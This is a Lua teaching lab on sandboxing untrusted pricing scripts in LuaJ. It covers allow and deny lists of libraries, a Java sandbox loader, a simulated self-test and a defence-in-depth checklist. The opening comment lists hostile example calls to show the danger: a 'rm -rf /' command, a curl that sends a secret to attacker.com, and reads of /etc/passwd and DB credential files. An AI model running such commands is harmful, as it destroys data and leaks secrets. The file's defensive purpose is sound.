--[[
  Lab 4: Lua Sandbox — Executing Untrusted Scripts Safely
  Run: lua examples/04-sandbox-security.lua

  CONTEXT
  ──────────────────────────────────────────────────────────────────────────────
  In the retail rules engine (03-retail-rules.lua), pricing scripts are loaded
  from an external source (S3, database, admin UI). Those scripts are written
  by business analysts or ops teams — NOT by the development team.

  Problem: Lua is a full scripting language. A malicious or accidentally broken
  script can do serious damage if executed in an unrestricted environment.

  This file covers:
    1. What "standard globals" gives a script (the danger)
    2. What a sandboxed environment allows vs denies
    3. How to build the sandbox in LuaJ (Java/Kotlin)
    4. How to test the sandbox from the Lua side
    5. Practical explanation framing

  LuaJ version assumed: 3.0.x (luaj-jse-3.0.1.jar)
──────────────────────────────────────────────────────────────────────────────
--]]

-- ─── 1. THE DANGER: What standardGlobals() exposes ───────────────────────────
--
-- JsePlatform.standardGlobals() loads ALL standard libraries. A script running
-- in that environment can:
--
--   os.execute("rm -rf /")              -- shell command on the server
--   os.execute("curl attacker.com/exfil?data=" .. secret)
--   io.open("/etc/passwd", "r")         -- read any file the JVM can access
--   io.open("/app/config/db.yml", "r")  -- read DB credentials
--   require("socket")                   -- load native/external modules
--   dofile("/etc/cron.d/evil")          -- execute arbitrary file
--   local jClass = luajava.bindClass("java.lang.Runtime")
--   jClass:getRuntime():exec("whoami")  -- Java RCE via reflection
--
-- This is NOT hypothetical. Any of the above can appear in a "pricing script"
-- uploaded by a compromised admin account or a supply chain attack on S3.

print("=== Sandbox Concept Demo ===")
print()

-- ─── 2. ALLOW LIST — what a business rules script legitimately needs ───────────
--
-- A pricing engine script needs:
--   math.*      → discount calculations, rounding, clamping
--   string.*    → formatting output, string.format
--   table.*     → table.insert, table.concat, pairs, ipairs
--   Basic types → tostring, tonumber, type, select, unpack/table.unpack
--   print       → logging (optional — you might redirect this to your logger)
--
-- A pricing engine script does NOT need:
--   io.*        → no file access
--   os.*        → no OS access (os.time() is borderline — provide it explicitly
--                              as a context field instead)
--   require     → no module loading
--   dofile      → no external file execution
--   load/loadstring → no dynamic code evaluation
--   debug.*     → no debug library (can be used to escape sandboxes)
--   luajava.*   → no Java reflection (full JVM access)
--   package.*   → no native library loading
--   coroutine.* → generally safe but not needed; omit for simplicity

-- ─── 3. SANDBOX IMPLEMENTATION in LuaJ (Java pseudocode) ─────────────────────
print("-- LuaJ Sandboxed Loader (Java/Kotlin) --")
print([[
import org.luaj.vm2.*;
import org.luaj.vm2.lib.*;
import org.luaj.vm2.lib.jse.*;

public class SandboxedLuaLoader {

    public static Globals createSandbox() {
        Globals globals = new Globals();

        // ── ALLOWED libraries ─────────────────────────────────────────────────
        globals.load(new JseBaseLib());       // print, tostring, type, pairs, etc.
        globals.load(new TableLib());         // table.insert, table.concat, etc.
        globals.load(new StringLib());        // string.format, string.find, etc.
        globals.load(new JseMathLib());       // math.floor, math.max, math.random

        // ── BLOCKED (do not load any of these) ───────────────────────────────
        // new JseIoLib()      → io.open, io.read — FILE ACCESS
        // new JseOsLib()      → os.execute, os.exit — SHELL/PROCESS ACCESS
        // new LuajavaLib()    → luajava.bindClass — JAVA REFLECTION/RCE
        // new PackageLib()    → require, package.loadlib — NATIVE MODULES
        // new CoroutineLib()  → not needed; skip for simplicity
        // new DebugLib()      → debug.getupvalue can escape sandbox

        // ── Remove dangerous functions from BaseLib ───────────────────────────
        // BaseLib loads 'load', 'loadstring', 'dofile', 'loadfile' by default.
        // Explicitly nil them out AFTER loading BaseLib:
        globals.set("load",       LuaValue.NIL);
        globals.set("loadstring", LuaValue.NIL);
        globals.set("dofile",     LuaValue.NIL);
        globals.set("loadfile",   LuaValue.NIL);
        globals.set("require",    LuaValue.NIL);

        // ── Provide safe time (instead of os.time) ────────────────────────────
        // Give the script "now" as a pre-computed value, not os access.
        // The host controls what time the script sees.
        globals.set("NOW_EPOCH", LuaValue.valueOf(System.currentTimeMillis() / 1000L));
        globals.set("TODAY",     LuaValue.valueOf("11-28")); // MM-DD, host-provided

        return globals;
    }

    public static LuaValue execute(String luaScript, LuaTable ctx) {
        Globals globals = createSandbox();
        globals.set("ctx", ctx);

        // Optional: set a CPU instruction limit to prevent infinite loops
        globals.running.hookfunc = new LuaFunction() {
            int instructions = 0;
            @Override public LuaValue call() {
                if (++instructions > 1_000_000)
                    throw new LuaError("Script exceeded instruction limit");
                return LuaValue.NIL;
            }
        };

        LuaValue chunk;
        try {
            chunk = globals.load(luaScript);
        } catch (LuaError e) {
            throw new IllegalArgumentException("Lua syntax error: " + e.getMessage(), e);
        }

        return chunk.call();   // throws LuaError on runtime error
    }
}
]])

-- ─── 4. SANDBOX VERIFICATION (Lua-side self-test) ────────────────────────────
-- In a real integration test, you would load a malicious script and assert
-- that each dangerous operation throws a LuaError (nil function call).
-- The following simulates what happens in a sandbox:

print()
print("-- Sandbox verification (simulated) --")

-- These would all be nil in a sandbox (runtime error when called):
local function simulateSandbox()
    local blocked = {
        io       = io,
        os       = os,
        require  = require,
        dofile   = dofile,
        load     = load,
        loadfile = loadfile,
        debug    = debug,
    }

    print()
    print("Checking globals available in this environment (lua CLI — NOT sandboxed):")
    for name, val in pairs(blocked) do
        local status = (val ~= nil) and "AVAILABLE (would be BLOCKED in sandbox)" or "nil — safe"
        print(string.format("  %-12s : %s", name, status))
    end

    -- Allowed:
    local allowed = {
        math     = math,
        string   = string,
        table    = table,
        print    = print,
        tostring = tostring,
        tonumber = tonumber,
        type     = type,
        pairs    = pairs,
        ipairs   = ipairs,
    }
    print()
    print("Globals that SHOULD be available in the sandbox:")
    for name, val in pairs(allowed) do
        print(string.format("  %-12s : %s", name, val ~= nil and "OK" or "MISSING"))
    end
end

simulateSandbox()

-- ─── 5. DEFENSE IN DEPTH — beyond the sandbox ────────────────────────────────
print()
print([[
=== Defense-in-depth checklist ===

1. SANDBOX (primary)
   - Load only math, string, table, base
   - Nil out: load, dofile, loadfile, require, loadstring
   - Never load: JseIoLib, JseOsLib, LuajavaLib, PackageLib, DebugLib

2. INSTRUCTION LIMIT (CPU exhaustion / infinite loops)
   - Set globals.running.hookfunc with a counter
   - Throw LuaError after N instructions (e.g., 1_000_000)

3. MEMORY LIMIT (heap exhaustion)
   - Run Lua in a separate thread with a fixed heap via -Xmx
   - Or use a ThreadGroup with a custom UncaughtExceptionHandler
   - Alternatively: catch OutOfMemoryError and terminate the script thread

4. INPUT VALIDATION (before the script sees it)
   - Validate ctx fields in Java before passing to Lua:
     * productId  : matches known product ID pattern
     * basePrice  : positive integer, within reasonable range
     * category   : one of a fixed enum set
     * customerTier: one of a fixed set
   - Reject scripts larger than N bytes (e.g., 64 KB for a pricing rule)

5. SCRIPT SIGNING (supply chain integrity)
   - Sign Lua scripts with HMAC when storing in S3
   - Verify signature before loading — reject unsigned scripts
   - This prevents a compromised S3 bucket from injecting malicious scripts

6. AUDIT LOGGING
   - Log every script load: source (S3 path/version), timestamp, who approved it
   - Log every execution: input ctx (excluding PII), result, execution time
   - Alert if execution time exceeds threshold (potential CPU attack)

7. SEPARATE PROCESS (maximum isolation)
   - For highest security: run Lua in a child process (ProcessBuilder)
     with no network access (seccomp / network namespace)
   - Communicate over stdin/stdout (JSON)
   - Kill process after timeout
   - Overhead: ~10ms startup — acceptable for non-hot-path rules

WHICH LEVEL TO USE?
  - Internal scripts (ops team, no external input) → sandbox + instruction limit
  - Admin UI (any staff can upload) → all of the above except separate process
  - External/marketplace scripts → separate process + signing + all of the above
]])

-- ─── 6. PRACTICAL FRAMING ────────────────────────────────────────────────────
print([[
=== How to explain this design clearly ===

Q: "You mentioned pricing rules in Lua loaded from S3. How do you prevent a
    compromised script from harming the system?"

A: "Three layers:

    First, sandbox the Lua environment. In LuaJ we build a minimal Globals object
    loading only math, string, table, and base libraries. We explicitly nil out
    load, dofile, require, and never load the io, os, or luajava libraries.
    That eliminates file access, shell execution, and Java reflection.

    Second, add resource limits. An instruction hook counts Lua opcodes and
    throws an error after one million instructions to stop infinite loops.
    Scripts are also size-limited at upload time.

    Third, sign scripts. When a rule is approved and stored in S3, we compute
    an HMAC signature and store it alongside the script. At load time the host
    verifies the signature before execution. A compromised S3 object without a
    valid signature is rejected.

    For audit: every load and execution is logged with the script version and
    who approved it, so we have a full trail if something goes wrong."
]])
